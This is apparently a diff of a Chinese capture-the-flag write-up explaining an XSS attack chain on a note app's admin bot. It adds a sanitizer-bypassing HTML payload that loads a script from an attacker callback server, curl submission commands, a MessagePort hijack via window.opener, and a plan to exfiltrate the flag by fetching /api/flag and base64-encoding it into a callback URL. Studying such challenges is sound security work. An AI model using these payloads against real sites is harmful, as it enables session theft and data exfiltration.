@@ -83,7 +83,7 @@ flag 在管理员专属接口 `/api/flag` 里，只有管理员会话能读到�
 
 ## 二、完整复现（从部署到拿到 flag）
 
-本章目标：从部署开始，按发生顺序走完整条攻击链，直到拿到 flag。涉及的浏览器机制都在用到它们的小节里就地解释，不要求提前理解。
+本章目标：从部署开始，按发生顺序走完整条攻击链，直到拿到 flag。全章分两段：2.2 到 2.4 是攻击必须吃透的三个对象（笔记检查器、机器人流程、审查页），每节末尾都落到攻击上（2.2.2、2.3.4 两处"攻击关联"，以及 2.4 末尾的四个问题及对应做法）；2.5 准备回调服务器，2.6 到 2.9 逐项解决这四个问题；2.10 把全部动作汇成完整时序。涉及的浏览器机制在使用它们的段落就地解释，不要求提前理解。
 
 ### 2.1 部署
 
@@ -120,6 +120,7 @@ curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3001/    # 期望 200
 创建笔记时，`/create` 会调用 `bot.js` 里的 `inspectDocument` 检查 HTML。检查过程是：**关闭 JavaScript、断网**，用 `page.setContent` 把 HTML 字符串直接交给无头浏览器渲染，然后检查最终 DOM：
 
 ```javascript
+// page 是 Puppeteer 的页面对象：bot.js 通过 Puppeteer 驱动容器内的无头 Chromium（bot/package.json 依赖 puppeteer ^24.32.0，package-lock.json 锁定 24.43.0）
 await page.setJavaScriptEnabled(false);   // 关闭 JavaScript：检查阶段不执行笔记中的脚本；解析规则随之变为"禁用脚本"模式（noscript 按标记解析，这是 2.6 的利用点之一）
 await page.setOfflineMode(true);           // 断网：检查阶段不加载任何外部资源（笔记无法在检查时与外部通信）
 await page.setContent(source, { waitUntil: "domcontentloaded", timeout: 5000 });   // 把 HTML 字符串直接写入页面：得到"笔记解析后的 DOM"供下面的判定读取（不经过网络加载）
@@ -230,6 +231,24 @@ HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 
 
 以上五个示例均已提交给真实检查器实测（`/create` 全部返回 302；未通过检查的笔记会返回 400）。
 
+#### 2.2.2 攻击关联：攻击笔记与七项条件的对应关系
+
+七项条件不是纸面规则：2.6.5 最终提交的攻击笔记，就是对着它们逐条做出来的。先看成品（完整推演见 2.6.5）：
+
+```html
+<!doctype html><head><?marker name="c"></head><div><template shadowrootmode=open><noscript><a alt="</noscript></template><script src=https://回调服务器/s.js></script>">x</a></noscript></template></div><template for=c><meta content="default-src 'none'"http-equiv=content-security-policy></template>
+```
+
+| 条件 | 攻击笔记里由什么满足 |
+|---|---|
+| 1 doctype | 开头就是 `<!doctype html>` |
+| 2、3 `head` 恰好 1 个元素、是带指定属性的 CSP meta | 由 DPU 提供：head 里只放 `<?marker name="c">` 占位点（处理指令，不是元素），meta 写在文档末尾的 `<template for=c>` 里，解析末尾被搬进 head（DPU 见 2.6.4） |
+| 4、5 `body` 恰好 1 个元素、是空 `div` | 危险内容全部放进 div 的声明式影子树；影子树的节点不是普通子节点，不参与计数（声明式影子树见 2.6.3） |
+| 6 `body` 文本为空白 | 影子树里的文本不计入 `body.textContent`（同上） |
+| 7 属性白名单 | 被计数的元素（`html`/`head`/`body`/`div`/`meta`）都不带多余属性；meta 只有 `http-equiv` 与 `content` |
+
+两句话总结：这份笔记在检查器眼里是一篇合法的空白文档（解析出的元素结构与最小示例一致，七项全过），在浏览器渲染时是一段会立即执行的脚本（noscript 两种解析模式的逐步推演见 2.6.5）。接下来 2.3 与 2.4 认识另外两个对象（机器人流程、审查页），末尾同样落到攻击上。
+
 ### 2.3 机器人的完整流程
 
 本节按调用顺序分三部分：`review()` 由什么触发、怎么被调用（2.3.1），它内部按什么顺序执行（2.3.2），以及它对提交页面的导航监听规则（2.3.3）。
@@ -239,7 +258,7 @@ HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 
 整个机器人流程由一次 **POST /report** 请求触发（攻击者提交目标网址就是这一步）。触发入口有两个（等价）：
 
 - 页面：打开实例首页（路由 `/`，即 2.1 里启动后 curl 验证的那个地址）。首页包含 "Create note" 与 "Report document" 两块面板和最近笔记列表；其中 "Report document" 面板是提交网址的入口，填写 URL 后点 Send，浏览器提交的就是 POST /report；
-- 命令行：`curl -d 'url=<目标网址>' http://<实例>/report`（复现脚本用这个，见第五章）。
+- 命令行：`curl -d 'url=<目标网址>' http://<实例>/report`（复现脚本用这个，见第五章；本挑战中这个网址的具体形态见 2.3.4）。
 
 "Report document" 面板的表单片段（来自 `src/views/index.ejs`，省略了外层的 `<p>` 与 `<label>` 标签），提交表单会调用`/report`接口：
 
@@ -367,13 +386,111 @@ await page.close();
 
 #### 2.3.3 watchDocument 的监听规则
 
-步骤 5 中的 `watchDocument` 是机器人对"提交网址页面"的导航监听，规则有三条：
+步骤 5 中的 `watchDocument` 是机器人对"提交网址页面"的导航监听。三个函数与逐行注释如下（`bot.js`）：
 
-1. 只统计主窗口（`page.mainFrame`）的**导航请求**（打开新文档的请求）；
-2. 第一个导航必须是你提交的网址（记作"入口"），否则记为"偏离"（`diverged = true`）；
-3. 此后每次导航：如果目标是 `http://localhost:3000/reports/check?rid=<本轮编号>`（本文称"命中审查页"），就设置 `finalized = approved && !diverged`；如果去了入口之外的其它网址（不含 `about:blank` 这类不产生网络请求的导航），就设置 `diverged = true`。
+```javascript
+/**
+ * 生成地址比较键：判断两个地址是否指向同一个文档目标。
+ *
+ * 归一化规则：
+ * - 用 new URL(value) 按 WHATWG 规则解析地址：
+ *   - 协议、主机名转小写；
+ *   - 去掉默认端口，如 http:80、https:443；
+ *   - 解析路径中的 "." 和 ".."；
+ *   - 对需要编码的字符做百分号编码。
+ * - 清空 url.hash：
+ *   - #片段不参与文档加载，只用于页内定位；
+ *   - 只差 #片段的两个地址，应视为同一个文档目标。
+ * - 返回 url.href，作为归一化后的完整地址字符串。
+ *
+ * 示例：
+ *   HTTP://Host.Docker.Internal:8000/a/../b?x=1#frag
+ *   -> http://host.docker.internal:8000/b?x=1
+ *
+ * 注意：
+ * - 只接受绝对 URL；相对地址需要传 base，否则 new URL 会抛错。
+ * - 查询参数不会排序，?a=1&b=2 和 ?b=2&a=1 会得到不同键。
+ * - 路径大小写敏感，/A 和 /a 不会归一成同一个键。
+ * - 协议、主机、端口、路径、查询参数不同，仍视为不同文档目标。
+ */
+function locationKey(value) {
+  const url = new URL(value);
+  url.hash = "";
+  return url.href;
+}
 
-> 记住第 3 条：`finalized` 是在"命中的那次导航请求发出时"设置的。也就是说，**让机器人主窗口导航到审查页这件事本身，就是设置 `finalized` 的手段**。这是 2.8 的基础。
+function isReportDocument(value, report) {
+  // 要检查的地址
+  const url = new URL(value);
+
+  // 应用本身的地址（比如 http://localhost:3000）
+  const app = new URL(APP_URL);
+
+  // 必须同时满足三个条件，才算当前审查的审查页：
+  return (
+    // 1. 同一个源（协议、主机、端口都一样）
+    url.origin === app.origin
+    // 2. 路径正好是 /reports/check
+    && url.pathname === "/reports/check"
+    // 3. 查询参数 rid 等于本次审查的 id
+    && url.searchParams.get("rid") === report.id
+  );
+}
+
+function watchDocument(page, report, entryUrl) {
+  // 入口地址归一化，方便后面比较，入口链接是你通过 `/report` 接口传入的需要审查目标链接
+  const entry = locationKey(entryUrl);
+
+  // 有没有到过入口
+  let entered = false;
+
+  // 到过入口之后，有没有跑偏到别的地址
+  let diverged = false;
+
+  // 监听这个页面的所有请求
+  page.on("request", (request) => {
+    // 只看主窗口的导航请求，其他（图片、iframe、脚本）都不管
+    if (!request.isNavigationRequest() || request.frame() !== page.mainFrame()) {
+      return;
+    }
+
+    // 这次导航要去哪
+    const next = request.url();
+
+    // 还没到过入口：这次是不是入口？
+    if (!entered) {
+      entered = locationKey(next) === entry;
+
+      // 如果这次不是入口，先记成跑偏；但后面一旦到了入口，会把它改回来
+      diverged = !entered;
+
+      // 没到入口之前，不往下判断
+      return;
+    }
+
+    // 已经到过入口了：这次是不是审查页 `/reports/check` ？
+    if (isReportDocument(next, report)) {
+      // 审查通过，并且到入口后没跑偏，才算最终确认
+      report.finalized = report.approved && !diverged;
+      return;
+    }
+
+    // 既不是审查页，也不是入口，那就是跑到别的地方去了
+    if (locationKey(next) !== entry) {
+      diverged = true;
+      report.finalized = false;
+    }
+  });
+}
+```
+
+#### 2.3.4 攻击关联：提交的真实链接与攻击窗口
+
+把上面这条流程放回攻击视角，复现里有三件事要交代：提交什么、什么时候动手、能用什么。
+
+- **提交的真实链接**：提交的就是攻击者入口页的地址，本地复现为 `http://host.docker.internal:8000/?note=<编号>`（回调服务器的准备见 2.5，`/` 路由即入口页；编号是 `/create` 创建笔记后返回的 `/note/<编号>` 里的数字）。机器人访问时会在它后面追加 `rid`（2.3.2 步骤 5 的 `url.searchParams.set("rid", report.id)`），所以入口页能从 `location.search` 读到本轮编号，用于第二次访问时把机器人 302 到审查页（2.8）。复现时提交它的命令（与 2.3.1 同形）：`curl -d 'url=http://host.docker.internal:8000/?note=<编号>' http://127.0.0.1:3001/report`。
+- **攻击窗口**：步骤 5 的 10 秒（`sleep(10000)`）就是全部攻击动作的时间窗；2.7（批准）与 2.8（时机）都发生在这段时间内。
+- **可用的杠杆**：入口页可读 `rid`；可用 `window.open` 打开审批页面，带着管理员会话（2.7.3）；`watchDocument` 只统计主窗口导航（2.3.3），攻击的导航序列按它的规则设计（2.8.2）。
 
 ### 2.4 审查页的两次访问（攻击目标）
 
@@ -448,23 +565,21 @@ app.post("/complete", (req, res) => {
   if (currentReview && currentReview.id === id
       && currentReview.prepared
       && req.session.admin
-      && state === currentReview.nonce) {   // 四项全对才置位
+      && state === currentReview.nonce) {   // 四项全对才置位；state 需等于 nonce（每轮随机生成、绑定本轮记录，且由审批页面打印在页面里，2.7）
     currentReview.approved = true;
   }
   res.type("text/plain").send("ok");
 });
 ```
 
-其中 `nonce` 是服务器在每轮审查开始时随机生成、绑定在本轮记录上的值；审批页面会把它打印在自己的页面里（2.7）。
-
 到这里，攻击的四个问题也就清楚了：
 
-1. **脚本执行问题**：笔记必须先通过 2.2 的检查，再在渲染时执行脚本（服务器输出笔记原文时没有 CSP 头，但笔记自带的 CSP meta 会禁止脚本；要绕过的是后者）；
-2. **批准问题**：`approved` 需要一次成功的 `/complete` 调用（四项全对），四项里 `admin` 与 `state` 都在机器人手里；
-3. **时机问题**：`policy` 需要一次"由浏览器发起"的顶层导航命中审查页；同时这次导航还要落进 `watchDocument` 的规则第 3 条来设置 `finalized`；
-4. **外传问题**：flag 进了页面之后怎么送出来。
+1. **脚本执行问题**：笔记必须先通过 2.2 的检查，再在渲染时执行脚本（服务器输出笔记原文时没有 CSP 头，但笔记自带的 CSP meta 会禁止脚本；要绕过的是后者）。做法：用 noscript 双解析、声明式影子树、DPU 拼一份"检查时是空白文档、渲染时是可执行脚本"的笔记（payload 与推演见 2.6.5）；
+2. **批准问题**：`approved` 需要一次成功的 `/complete` 调用（四项全对），四项里 `admin` 与 `state` 都在机器人手里。做法：笔记脚本把沙箱的 MessagePort 转交给入口页，由入口页冒充"笔记已就绪"，审批页面因此以自身身份调用 `/complete`（步骤与代码见 2.7）；
+3. **时机问题**：`policy` 需要一次"由浏览器发起"的顶层导航命中审查页；同时这次导航还要落进 `watchDocument` 的规则第 3 条来设置 `finalized`。做法：入口页、弹窗、helper 三页配合，制造一次浏览器发起的回退导航（先 `about:blank`，再 `history.back()`），经回调服务器 302 落到审查页（序列与代码见 2.8）；
+4. **外传问题**：flag 进了页面之后怎么送出来。做法：笔记原文在审查页顶层再执行一次，同源 `fetch('/api/flag')` 取回内容，base64 编码进回调服务器 URL（脚本见 2.9）。
 
-2.6 到 2.9 依次解决。
+2.6 到 2.9 依次解决，每节给出做法、代码与本地验证。
 
 ### 2.5 回调服务器准备
 
@@ -478,6 +593,8 @@ app.post("/complete", (req, res) => {
 | `/flag?x=<base64>` | 无 | 无 | 接收外传的 flag（2.9） |
 
 `/` 和 `/s.js` 的具体内容在对应小节逐段给出。所有响应都带 `Cache-Control: no-store`（入口页这一条在 2.8 会用到）。
+
+实现与启动：回调服务器与整套攻击编排写在同一个 Python 脚本里（完整可运行代码见第五章），在宿主机直接运行该脚本即启动（监听 8000 端口；环境与步骤见 6.2）。2.6 到 2.9 会在用到它的地方引用对应代码段。
 
 ### 2.6 问题一：让笔记在渲染时执行脚本
 
@@ -620,6 +737,14 @@ DPU 是 2026 年 5 月 19 日发布的 HTML 新提案（Chrome 官方博客《De
 | script 元素 | 不存在（只是 alt 属性值里的字符串） | 存在并执行 |
 | 执行时 CSP | 不涉及 | 尚未生效（meta 还没进 head） |
 
+创建这份笔记并取回编号：把上面那一行原样保存为 `payload.html`（单引号与无引号属性不要改动），然后提交（与 2.2 的提交方式相同）：
+
+```bash
+curl -si http://127.0.0.1:3001/create -d 'title=t' --data-urlencode html@payload.html | head -3
+# 期望：HTTP/1.1 302 Found   Location: /note/<编号>
+# 记下 <编号>：2.6.6 的验证与 2.3.4 的提交地址都要带上它；第五章脚本的取法：note_id = created.headers["Location"].rsplit("/", 1)[-1]
+```
+
 #### 2.6.6 本地验证脚本确实在渲染时执行
 
 机器人不会主动打开审批页面，因此默认流程里不会发生笔记的解析渲染（脚本不会执行）；要单独验证脚本能执行，需要把机器人引到 `/review`，由沙箱 iframe 加载笔记。步骤：
@@ -677,10 +802,13 @@ DPU 是 2026 年 5 月 19 日发布的 HTML 新提案（Chrome 官方博客《De
 
 ```javascript
 // 在沙箱（/sandbox）中运行时走这里：收到端口后把它转交给"审批页面的打开者"
+// parent.opener 链：沙箱页的父窗口是审批页面；审批页面的 opener 是打开它的入口页（攻击者页面）。
+// window.opener 是浏览器提供的窗口引用，允许跨源向它 postMessage；引用得以保留的前提是
+// 审批页面没有设置 COOP（本题 helmet 配置 crossOriginOpenerPolicy: false）。
 onmessage = e => { if (e.ports[0]) parent.opener.postMessage(0, "*", e.ports); };
 ```
 
-`parent.opener` 的含义：沙箱页的父窗口是审批页面；审批页面的 `opener` 是"打开审批页面的那个窗口"，也就是攻击者的入口页。`window.opener` 可以跨源访问（它是浏览器提供的窗口引用，允许跨源向它 `postMessage`）；该引用得以保留的前提是审批页面没有设置 `Cross-Origin-Opener-Policy: same-origin`（COOP 会切断跨源 opener 关系），本题源码中的 helmet 配置关闭了 COOP（`crossOriginOpenerPolicy: false`）。于是端口 B 的完整流转路径是：
+端口 B 的完整流转路径是：
 
 ```
 审批页面 --(postMessage 转移)--> 沙箱 iframe 里的笔记 --(s.js 转交)--> 入口页
@@ -841,7 +969,7 @@ if (location.pathname == "/reports/check") {
 
 分支一能成功读取 `/api/flag` 的原因：审查页的第二次访问是一次顶层导航，机器人浏览器的管理员 cookie 在当前页面（`localhost:3000`）上有效；`/api/flag` 与当前页面同源，`fetch` 自动携带该 cookie。
 
-外传使用 `btoa(...)` 把响应内容（JSON 文本）编码进 URL 查询参数。这里绕开的是"让数据离开浏览器"的最后一环：浏览器允许页面把当前窗口导航到任意地址，查询参数即数据通道。回调服务器收到 `/flag?x=...` 后做一次 base64 解码，取出其中的 flag 值。
+外传使用 `btoa(...)` 把响应内容（JSON 文本）编码进 URL 查询参数。这里绕开的是"让数据离开浏览器"的最后一环：浏览器允许页面把当前窗口导航到任意地址，查询参数即数据通道。回调服务器收到 `/flag?x=...` 后做一次 base64 解码，取出其中的 flag 值（实现见第五章路由 4）。
 
 ### 2.10 攻击链完整时序
 
